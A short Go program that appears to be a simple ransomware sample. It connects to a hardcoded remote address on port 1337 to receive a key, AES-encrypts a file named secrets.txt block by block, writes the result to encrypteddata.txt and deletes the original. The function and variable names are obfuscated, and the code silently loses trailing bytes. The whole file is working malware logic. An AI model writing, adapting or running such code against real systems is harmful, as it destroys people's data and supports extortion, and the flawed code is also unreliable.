package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"crypto/aes"
	"encoding/hex"
)

var n3tw0rk string = "34.100.233.12:1337"



func encrypt(key string,data []byte) string {
	k:=[]byte(key)
	k=k[0:32]

	c, _ := aes.NewCipher(k)
	
	out := make([]byte, len(data))
	c.Encrypt(out,[]byte(data))
	
	
	return hex.EncodeToString(out)
}

func mod346dhjs(k *string){
*k="F8709"+*k+"F8709"
}

func cryptbyte(key string) {

	data, err := ioutil.ReadFile("secrets.txt")

	if err != nil {
		fmt.Println("Testing____")
	}
	m:=""
	for i:=0;i+16<=len(data);i+=16{
	m+= encrypt(key,data[i:i+16])
	}

file,err:=os.Create("encrypteddata.txt")
file.WriteString(m)
os.Remove("secrets.txt")
defer file.Close()


}

func mod63268(k *string) {

	c, err := net.Dial("tcp", n3tw0rk)
	if err != nil {
		fmt.Print(err)
		return
	}
	message, _ := bufio.NewReader(c).ReadString('\n')
	*k = message
	

}

func main(){
	var k string
	mod63268(&k)
	cryptbyte(k)
}




	